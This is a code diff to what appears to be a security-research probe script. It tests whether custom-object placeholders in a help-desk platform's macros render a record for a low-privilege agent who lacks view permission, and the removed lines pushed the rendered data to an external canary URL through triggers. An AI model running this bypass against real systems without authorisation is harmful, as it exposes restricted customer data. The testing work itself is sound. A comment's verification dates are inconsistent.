@@ -609,25 +609,32 @@ def probe_zd3(client, run, ui_done, poll_minutes):
 
 # --------------------------------------------------------------------------
 # ZD-5 — Custom Objects placeholder permission bypass (FE-01).
-# Official help (verified 2026-11-05): "Object permissions aren't checked
-# or enforced by placeholders", while lookup fields render BLANK in the
-# Agent Workspace for agents without view permission — the asymmetry this
-# probe measures across evaluation surfaces.
+# Official help (verified 2026-11-05; still current 2026-08-26): "Object
+# permissions aren't checked or enforced by placeholders", while lookup
+# fields render BLANK in the Agent Workspace for agents without view
+# permission — the asymmetry this probe measures.
 #
-# Fixtures (admin): object type moka_probe + text field marker_field +
-# one record whose marker_field = MARKER; a ticket lookup field linking
-# tickets to the object; a macro whose comment body renders the marker via
-# the lookup placeholder; an HTTP target -> canary A; two triggers whose
-# notification body renders the marker (admin-context control leg and
-# LOW-created-ticket test leg); an object trigger as fallback surface.
-# Restriction (UI lane, --ui-done): access rules / role permissions set so
-# the LOW agent CANNOT view the record. The script PROVES the restriction
-# objectively (LOW identity GET record must fail) before judging any leg.
+# Fixture facts (docs-verified 2026-11-09, work/zd5-fixture-facts.md):
+#   - Ticket lookup field: relationship_target_type must be
+#     "zen:custom_object:<key>" (the "zen:" prefix was missing — 422).
+#   - Placeholder form is SINGULAR: {{ticket.ticket_field_<FID>...}}
+#     (plural ticket_fields_ in third-party posts is wrong).
+#   - http_target is extinct on modern tenants (400 InvalidTargetType),
+#     so the old trigger->target legs are gone. The decisive surface is
+#     the MACRO leg: a macro whose comment renders the marker through the
+#     lookup placeholder, applied in the LOW agent's own context (the
+#     attacker pass's re-aimed shape: write it onto the ticket surface
+#     and read it back = view-permission bypass completed).
 #
-# Placeholder forms (published sources disagree: ticket_fields_<id> vs
-# ticket_field_<id>): the probe uses the plural form and lets the CONTROL
-# leg validate rendering — if the control canary stays silent, verdict is
-# INCONCLUSIVE (syntax), never HELD.
+# Design: restriction is PROVEN first (LOW GET record must fail). Then a
+# CONTROL leg (admin applies the macro to a linked ticket; marker must
+# render) validates the placeholder plumbing in a privileged context.
+# Only then the TEST leg (LOW applies the same macro to a linked ticket
+# assigned to them): marker in the rendered comment = BROKEN; masked =
+# HELD for this surface. If the control never renders, the verdict is
+# INCONCLUSIVE — silent test legs are never read as HELD. The Agent
+# Workspace UI render of the lookup field (browser lane) remains a
+# separate observation before the card is closed.
 # --------------------------------------------------------------------------
 OBJ_KEY = "moka_probe"
 
@@ -685,12 +692,12 @@ def probe_zd5(client, run, ui_done, poll_minutes):
     run.add("custom_object_record", rec_id, {"object": OBJ_KEY})
 
     # Ticket lookup field -> this object (links tickets to the record).
+    # relationship_target_type needs the "zen:" prefix (docs-verified).
     st, parsed, _ = client.call("zd5-create-lookup", "POST",
                                 "/ticket_fields.json", {
         "ticket_field": {"type": "lookup", "title": "moka zd5 link",
-                         "relationship_target": f"custom_object:{OBJ_KEY}",
                          "relationship_target_type":
-                         f"custom_object:{OBJ_KEY}"}})
+                         f"zen:custom_object:{OBJ_KEY}"}})
     lookup = ((parsed or {}).get("ticket_field") or {})
     lookup_id = lookup.get("id")
     if not lookup_id:
@@ -701,12 +708,12 @@ def probe_zd5(client, run, ui_done, poll_minutes):
                 lookup_id = f.get("id")
     if lookup_id:
         run.add("ticket_field", lookup_id)
-        placeholder = ("{{ticket.ticket_fields_%s.custom_fields."
+        placeholder = ("{{ticket.ticket_field_%s.custom_fields."
                        "marker_field}}" % lookup_id)
     else:
-        placeholder = None
-        run.note("lookup field creation failed; ticket-context legs "
-                 "skipped, object-trigger leg still runs")
+        return run.verdict("INCONCLUSIVE", [
+            "lookup field creation failed again (see saved body); the "
+            "ticket-context legs cannot run. Not HELD."])
 
     # LOW agent must exist and be verified (invite accepted in UI lane).
     st, parsed, _ = client.call(
@@ -729,6 +736,7 @@ def probe_zd5(client, run, ui_done, poll_minutes):
             "LOW agent exists but is not verified yet (invite not accepted "
             "in the browser lane). Token auth only works for verified "
             "users; accept the invite, then re-run."])
+    low_id = low_user.get("id")
 
     if not ui_done:
         print("PRECONDITION (UI lane, then re-run with --ui-done):")
@@ -752,52 +760,15 @@ def probe_zd5(client, run, ui_done, poll_minutes):
     print(f"STEP zd5-restriction-proof low GET record status={st} "
           "(non-200 = restriction in effect)")
 
-    canary_a = os.environ.get("CANARY_A_URL")
-    reasons, broken, control_ok = [], False, False
+    reasons = []
 
-    # HTTP target -> canary A (external delivery observation point).
-    target_id = None
-    if canary_a:
-        st, parsed, _ = client.call("zd5-create-target", "POST",
-                                    "/targets.json", {
-            "target": {"type": "http_target", "title": "moka zd5 canary",
-                       "method": "post", "target_url": canary_a,
-                       "content_type": "application/json", "active": True}})
-        target_id = ((parsed or {}).get("target") or {}).get("id")
-        if target_id:
-            run.add("target", target_id)
-
-    def make_trigger(title, tag):
-        # Triggers cannot add comments; the observable action is the
-        # external notification to the HTTP target with the placeholder
-        # rendered into its message body.
-        if not target_id or not placeholder:
-            return None
-        actions = [["notification_target", target_id,
-                    f"zd5 probe {title}: {placeholder}"]]
-        st, parsed, _ = client.call(f"zd5-trigger-{tag}", "POST",
-                                    "/triggers.json", {
-            "trigger": {"title": title, "active": True,
-                        "conditions": {"all": [
-                            {"field": "tags",
-                             "operator": "contains_at_least_one_of_the_"
-                                         "following",
-                             "value": tag}], "any": []},
-                        "actions": actions}})
-        tid = ((parsed or {}).get("trigger") or {}).get("id")
-        if tid:
-            run.add("trigger", tid)
-        return tid
-
-    poll_a = os.environ.get("CANARY_A_POLL")
-
-    def linked_ticket(as_client, tag):
+    def linked_ticket(as_client, tag, assignee=None):
         body = {"ticket": {
             "subject": f"moka zd5 {tag}", "tags": [tag],
-            "comment": {"body": "zd5 probe ticket", "public": True}}}
-        if lookup_id:
-            body["ticket"]["custom_fields"] = [
-                {"id": lookup_id, "value": rec_id}]
+            "comment": {"body": "zd5 probe ticket", "public": True},
+            "custom_fields": [{"id": lookup_id, "value": rec_id}]}}
+        if assignee:
+            body["ticket"]["assignee_id"] = assignee
         st, parsed, _ = as_client.call(f"zd5-ticket-{tag}", "POST",
                                        "/tickets.json", body)
         tid = ((parsed or {}).get("ticket") or {}).get("id")
@@ -805,83 +776,75 @@ def probe_zd5(client, run, ui_done, poll_minutes):
             run.add("ticket", tid)
         return tid
 
-    # CONTROL leg: admin creates the linked ticket; trigger notification
-    # must deliver the marker to canary A (validates placeholder syntax,
-    # trigger plumbing, and external delivery in the privileged context).
-    if target_id and placeholder:
-        make_trigger("moka zd5 control", "moka_zd5_control")
-        linked_ticket(client, "moka_zd5_control")
-        hit = poll_canary(poll_a, marker_value, poll_minutes, run.dir,
-                          "A-control")
-        control_ok = hit is True
-        reasons.append(f"control leg canary delivery: {hit}")
-    else:
-        run.note("control leg skipped (no canary target or no lookup)")
+    def comments_have_marker(as_client, tid, tag):
+        st, parsed, raw = as_client.call(
+            f"zd5-comments-{tag}", "GET", f"/tickets/{tid}/comments.json")
+        return marker_value.encode() in raw
 
-    # TEST leg 1 (trigger): LOW agent creates the linked ticket; the same
-    # trigger machinery now evaluates in a flow the LOW agent initiated.
-    if target_id and placeholder:
-        make_trigger("moka zd5 test", "moka_zd5_test")
-        linked_ticket(low, "moka_zd5_test")
-        hit = poll_canary(poll_a, marker_value, poll_minutes, run.dir,
-                          "A-test")
-        if hit is True:
-            broken = True
-            reasons.append(
-                "TEST trigger leg: marker delivered to the external canary "
-                "from a ticket created by the LOW agent who cannot view "
-                "the record — server-side placeholder evaluation ignored "
-                "the object permission, with external delivery (impact).")
-        else:
-            reasons.append(f"test trigger leg canary delivery: {hit}")
+    # Macro whose comment renders the marker via the lookup placeholder.
+    st, parsed, _ = client.call("zd5-create-macro", "POST",
+                                "/macros.json", {
+        "macro": {"title": "moka zd5 macro", "active": True,
+                  "actions": [{"field": "comment_value",
+                               "value": placeholder}]}})
+    macro_id = ((parsed or {}).get("macro") or {}).get("id")
+    if not macro_id:
+        return run.verdict("INCONCLUSIVE", reasons + [
+            f"macro creation failed status={st}; see saved body"])
+    run.add("macro", macro_id)
 
-    # TEST leg 2 (macro render): macro whose comment renders the marker;
-    # LOW identity asks the API for the macro's changes on the linked
-    # ticket — if the marker is rendered for the LOW agent, the value is
-    # exposed in their context despite no view permission.
-    if placeholder:
-        st, parsed, _ = client.call("zd5-create-macro", "POST",
-                                    "/macros.json", {
-            "macro": {"title": "moka zd5 macro", "active": True,
-                      "actions": [{"field": "comment_value",
-                                   "value": placeholder}]}})
-        macro_id = ((parsed or {}).get("macro") or {}).get("id")
-        if macro_id:
-            run.add("macro", macro_id)
-            t_low = linked_ticket(low, "moka_zd5_macro")
-            if t_low:
-                st, parsed, raw = low.call(
-                    "zd5-low-macro-apply", "GET",
-                    f"/macros/{macro_id}/apply.json")
-                if marker_value.encode() in raw:
-                    broken = True
-                    reasons.append(
-                        "MACRO leg: the macro's rendered changes, fetched "
-                        "as the LOW agent, contain the marker value the "
-                        "agent cannot view in the UI — placeholder "
-                        "evaluation ignored the object permission.")
-                else:
-                    reasons.append(
-                        "macro leg: rendered changes for LOW contain no "
-                        "marker (masked/empty)")
+    def apply_macro(as_client, tid, tag):
+        """Apply the macro to a ticket in this identity's context; True
+        if the marker ends up in the ticket's comments afterwards."""
+        st, parsed, raw = as_client.call(
+            f"zd5-apply-{tag}", "POST",
+            f"/tickets/{tid}/macros/{macro_id}/apply.json")
+        print(f"STEP zd5-apply-{tag} status={st}")
+        if marker_value.encode() in raw:
+            return True
+        if tid:
+            return comments_have_marker(as_client, tid, tag)
+        return False
 
+    # CONTROL leg: admin applies the macro to a linked ticket. The
+    # marker MUST render here, or the plumbing/syntax is unproven.
+    t_admin = linked_ticket(client, "moka_zd5_control")
+    control_ok = bool(t_admin) and apply_macro(client, t_admin, "control")
+    reasons.append(f"control leg (admin macro render): {control_ok}")
+    if not control_ok:
+        return run.verdict("INCONCLUSIVE", reasons + [
+            "Control leg never rendered the marker: placeholder syntax "
+            "or macro-apply plumbing unproven — inspect the saved apply "
+            "and comments bodies. Do NOT read the test leg as HELD."])
+
+    # Secondary observation: can LOW even LINK the record they cannot
+    # view (write-side seam)? Recorded, not part of the verdict core.
+    t_low_created = linked_ticket(low, "moka_zd5_lowlink")
+    reasons.append(
+        f"LOW-created linked ticket (write-side link): "
+        f"{bool(t_low_created)}")
+
+    # TEST leg: a linked ticket assigned to LOW; LOW applies the macro
+    # in their own context and reads the rendered comment back.
+    t_test = linked_ticket(client, "moka_zd5_test", assignee=low_id)
+    if not t_test:
+        return run.verdict("INCONCLUSIVE", reasons + [
+            "test ticket creation failed; see saved body"])
+    broken = apply_macro(low, t_test, "test")
     if broken:
         return run.verdict("BROKEN", reasons + [
-            "Brief acceptance met: data the LOW agent cannot view reached "
-            "an external destination / the LOW context itself, with the "
-            "restriction proof holding. Filing grade still requires a 2nd "
-            "consecutive reproduction + side-effect checks."])
-    if not control_ok and (target_id and placeholder):
-        return run.verdict("INCONCLUSIVE", reasons + [
-            "Control leg never delivered: placeholder syntax or trigger "
-            "plumbing unproven — fix the fixture (check saved bodies; the "
-            "singular/plural placeholder form is the first suspect). Do "
-            "NOT read silent test legs as HELD."])
+            "MACRO leg: the macro applied BY the LOW agent rendered the "
+            "marker value of a record the agent cannot view (direct GET "
+            "= 403, proven above) into a ticket comment the agent reads "
+            "— placeholder evaluation ignored the object permission and "
+            "completed the read in the agent's own context. Filing grade "
+            "still requires a 2nd consecutive reproduction + side-effect "
+            "checks."])
     return run.verdict("HELD", reasons + [
-        "Control rendered and delivered, but every LOW-context evaluation "
-        "surface masked the marker. Matches the card's benign prediction "
-        "for the tested surfaces (UI leg still to be observed in the "
-        "browser lane before closing the card)."])
+        "Control rendered for admin, but the LOW-context macro render "
+        "masked the marker. Matches the card's benign prediction for "
+        "this surface (the Agent Workspace UI render remains a separate "
+        "observation before closing the card)."])
 
 
 # --------------------------------------------------------------------------
